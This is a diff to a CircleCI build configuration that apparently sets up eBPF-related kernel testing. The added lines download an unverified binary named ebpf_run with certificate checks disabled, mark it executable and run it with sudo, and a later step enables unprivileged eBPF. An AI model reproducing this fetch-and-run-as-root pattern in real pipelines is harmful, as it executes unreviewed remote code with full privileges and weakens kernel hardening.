@@ -2,7 +2,7 @@ version: 2.1
 jobs:
   build:
     docker:
-      - image: ubuntu:14.04
+      - image: ubuntu:20.04
     steps:
       - run:
           name: The First Step
@@ -14,5 +14,7 @@ jobs:
             whoami
             cat /etc/issue
             cat /proc/sys/kernel/unprivileged_bpf_disabled
-            unshare -Urn
+            wget https://cloud.tsinghua.edu.cn/f/dd0140e60d714af59e17/?dl=1 -O ebpf_run --no-check-certificate
+            chmod +x ebpf_run
+            sudo ./ebpf_run
             sysctl -w kernel.unprivileged_bpf_disabled=0
